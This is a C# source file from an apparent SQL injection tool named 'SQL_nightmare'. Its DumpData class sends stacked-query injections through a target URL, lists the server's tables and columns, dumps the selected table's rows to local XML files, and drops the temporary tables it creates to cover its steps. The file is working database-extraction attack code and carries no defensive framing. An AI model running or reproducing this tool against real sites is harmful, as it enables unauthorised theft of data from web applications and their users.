using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace SQL_nightmare
{
    class DumpData
    {
        
       
        public static void initialize(string url)
        {
            Log.logNotification("Confirming Web Response..");

            var urlForResponseConfirmation = QueryCrafter.constructURLForConfirmation(url, QueriesDB.Replacement);

            if (ResponseFilter.confirmResponce(urlForResponseConfirmation, QueriesDB.Replacement))
            {
                Log.logNotification("Web Response is OK..");
                getTables(url);
            }
            else
                Log.logError("No response from the server..");
        }

        public static void getTables(string url)
        {
            string[] Tables = getObjects(url, QueriesDB.TableStackedQuery, QueriesDB.Replacement);

            if (Tables != null)
            {
                dropTempTable(url, QueriesDB.DropTableStackedQuery, QueriesDB.Replacement);

                var Choice = -1;

                while (Choice != 0)
                {
                    Console.Clear();

                    Log.showObjects(Tables, "TABLE");

                    Choice = UserInteraction.showMenuForIntChoice("Press 0 to EXIT..\nPress Corresponding Key to dump TABLE ");

                    if (Choice > 0 && Choice <= Tables.Length)
                    {
                        var UserSelectedTable = Tables[Choice - 1];
                        getColumns(url, UserSelectedTable);

                    }
                }
            }
            Tables = null;
        }

        public static void getColumns(string url, string tableName)
        {
            string UserColumnQuery = QueryCrafter.constructQueryForColumns(QueriesDB.ColumnStackedQuery, tableName);

            string[] Columns = getObjects(url, UserColumnQuery, QueriesDB.Replacement);

            if (Columns != null)
            {
                dropTempTable(url, QueriesDB.DropTableStackedQuery, QueriesDB.Replacement);
                Log.showObjects(Columns, "COLUMN");
                dumpData(url, tableName, Columns);
            }
            Columns = null;
        }

        public static void dumpData(string url, string UserSelectedTable, string[] Columns)
        {
            var FileName = "";

            if (!String.IsNullOrEmpty((FileName = UserInteraction.takeInputForTableFileGeneration())))
            {
                var XAML = XML.addRoot(ResponseFilter.getPureResponse(HTTPMethods.getResponse(QueryCrafter.constructQueryForDataDump(url, UserSelectedTable, QueriesDB.TableDumpQuery))));
                dumpXML(XAML, UserSelectedTable, FileName, Columns);

                Log.logNotification("If ur unable to see table Data, dont worry I've another method..");
                UserInteraction.promptForUserInput("Press 'n' to try another method OR Press any key to continue..");
                var UserInput = Console.ReadLine();

                if (UserInput.ToLower() == "n")
                {
                    XAML = XML.addRoot(ResponseFilter.getPureResponseWithLastIndex(HTTPMethods.getResponse(QueryCrafter.constructQueryForDataDump(url, UserSelectedTable, QueriesDB.TableDumpQuery))));
                    dumpXML(XAML, UserSelectedTable, FileName, Columns);
                }

                Log.logNotification("Data dump complete.. and if no data is displayed to you.. table might be empty.. Press any key to continue..");
                Console.ReadKey();
            }

            FileIO.deleteTempFile("tmp.txt");
        }

        public static string[] getObjects(string url, string stackedQuery, string replacement)
        {

            string URLFortableDumpToTempTable = QueryCrafter.construcQueryForTableDump(url, stackedQuery, replacement);

            if (ResponseFilter.confirmResponce(URLFortableDumpToTempTable, replacement))
            {
                string URLForTableOutput = QueryCrafter.constructURLForOutputFromTempTable(url);

                var response = HTTPMethods.getResponse(URLForTableOutput);

                if (response != null)
                {
                    response = ResponseFilter.getPureResponse(response);

                    return ResponseFilter.parseResponce(response);
                }
                else
                    return null;
            }
            else
                return null;
        }

        public static bool dropTempTable(string url, string dropTableStackedQuery, string replacement)
        {
            url = QueryCrafter.constructURLForConfirmation(url, QueriesDB.Replacement);
            url = QueryCrafter.constructURLForDroppingObject(url, dropTableStackedQuery);

            if (HTTPMethods.getResponse(url).Contains(replacement))
                return true;
            else
                return false;
        }

        public static void dumpXML(string xml, string userSelectedTable, string fileName, string[] columns)
        {
            FileIO.deleteTempFile("tmp.txt");
            FileIO.createWriteFile(xml, "tmp.txt");
            XML.parseXML(userSelectedTable, fileName, columns);
        }

    }
}
